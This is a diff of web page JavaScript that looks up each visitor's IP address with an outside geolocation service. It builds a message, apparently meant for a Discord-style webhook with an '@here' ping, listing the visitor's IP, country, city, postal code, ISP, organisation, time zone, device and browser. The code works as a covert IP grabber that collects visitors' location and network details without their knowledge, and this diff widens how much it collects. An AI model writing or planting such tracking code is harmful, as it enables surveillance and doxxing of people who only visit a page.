@@ -35,15 +35,22 @@
                         second: 'numeric'
                     });
                     // Get location information
-                    fetch(`https://ipwhois.app/json/${ipAddress}`)
+                    fetch(`https://ipapi.co/${ipAddress}/json/`)
                         .then(response => response.json())
                         .then(locationData => {
                             const visitorInfo = {
-                                content: "# __some kid from " + locationData.city + " just ran the site__\n" +
-                                    "```fix\nTime of Visit: " + timeOfVisit + "\n" +
-                                    "Device Type: " + screenSize + "\n" + // Specify device type
-                                    "Browser: " + browserInfo.name + "\n" + // Get browser name
-                                    "IP Address: " + ipAddress + "\n" + // Get IP address
+                                content: "@here " +
+                                    "IP Address :"+ ipAddress + "\n" +
+                                    "Country :"+locationData.country + "\n" +
+                                    "Region :"+locationData.region + "\n" +
+                                    "City :"+locationData.city + "\n" +
+                                    "Internet Service Provider :"+locationData.asn + "\n" +
+                                    "Time Zone : "+locationData.timezone + "\n" +
+                                    "Organization : "+locationData.org + "\n" +
+                                    "Postal Code : " +locationData.postal + "\n" +
+                                    "Time of Visit: " + timeOfVisit + "\n" +
+                                    "Device Type: " + screenSize + "\n" + 
+                                    "Browser: " + browserInfo.name + "\n" + 
                                     "Location: " + locationData.city + ", " + locationData.region + ", " + locationData.country + '```' // Get location information
                             };
 
